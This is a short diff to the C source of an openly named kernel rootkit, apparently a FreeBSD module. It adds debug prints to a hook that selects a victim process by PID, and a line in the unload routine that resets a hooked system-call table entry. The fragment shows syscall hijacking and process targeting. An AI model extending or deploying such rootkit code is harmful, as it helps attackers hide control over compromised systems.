@@ -106,7 +106,9 @@ command_hook (struct thread * td, void * syscall_args) {
   // mean that we don't want to attack any process.
   //
   struct config_args * argsp = (struct config_args *)(syscall_args);
+  printf ("rootkit: Looking for process %d\n", argsp->victimPID);
   victimProc = (argsp->victimPID) ?  pfind (argsp->victimPID) : 0;
+  printf ("rootkit: Victim process %p\n", victimProc);
   return;
 }
 
@@ -151,6 +153,7 @@ unloadRootkit (void) {
   // Restore all hooked system calls.
   //
   sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
+  sysent[11].sy_call = (sy_call_t *) nosys;
 }
 
 //
